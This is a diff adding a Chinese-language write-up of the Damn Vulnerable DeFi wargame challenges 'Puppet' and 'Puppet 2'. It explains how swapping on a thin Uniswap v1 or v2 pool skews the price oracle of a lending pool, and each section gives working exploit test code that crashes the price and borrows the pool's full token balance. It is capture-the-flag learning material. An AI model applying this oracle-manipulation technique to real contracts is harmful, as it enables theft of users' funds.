@@ -339,4 +339,98 @@ Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)
         });
     ```
 
+---
+
+## 8 Puppet
+
+
+
+- 目標
+
+    讓attacker拿走UNI Exchange裡全部token
+
+- 問題
+
+    UNI裡面的流動性少於attacker，又因公式是ETH/Token兩者數量去算出對應數字，
+
+    一開始是1:1，但是透過對UNI Exchange的swap操作，可以控制兌換的比例
+
+    這題會用到UNI swap v1
+    
+    這裡直接參考[官方文件](https://docs.uniswap.org/contracts/v1/reference/exchange)
+
+    這裡使用UNI的tokenToEthSwapInput
+    
+    ![](https://i.imgur.com/f0wulSA.png)
+    
+    先嘗試把所有attacker的token兌換目標為1 wei ETH
+    
+    發現不符合題目要求最後attacker的要超過100000顆
+    
+    所以改成attacker手上的減一顆
+
+- 前端程式
+    ```javascript=
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */   
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapExchange
+        .connect(attacker)
+        .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1,( await ethers.provider.getBlock("latest")).timestamp * 2);
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ATTACKER_INITIAL_ETH_BALANCE });
+
+    });
+    ```
+    
+---
+
+## 9 Puppet 2
+
+- 目標
+
+    讓attacker拿走UNI Exchange裡全部token
+
+- 問題
+
+    幾乎等於上一題程式
+
+    只是改用了[UNI v2](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02)當價格來源
+
+    但是UNI v2一樣是透過兩種幣的數量控制兌換比例
+
+    所以有足夠的抵押品就可以拿出全部的幣
+
+    比較麻煩的問題是這次抵押品是wETH
+
+    然後初始化並沒有給attacker wETH
+
+    只有給token跟ETH
+
+    所以透過UNI Swap把token兌換成wETH
+
+    發現還是不夠
+
+    接著把手上的ETH都換(deposit)成wETH之後就足夠了(扣掉gas所以少換0.1)
+
+- 前端程式
+
+    ```javascript=
+     it('Exploit', async function () {
+            /** CODE YOUR EXPLOIT HERE */
+            await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+            await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+                    ATTACKER_INITIAL_TOKEN_BALANCE,                  
+                    1,                                               
+                    [this.token.address,  this.weth.address], 
+                    attacker.address,                               
+                    (await ethers.provider.getBlock("latest")).timestamp * 2                                      
+            );
+
+            await this.weth.connect(attacker).deposit({ value: ethers.utils.parseEther('19.9') });
+            await this.weth.connect(attacker).approve(this.lendingPool.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+            await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        });
+    ```
 
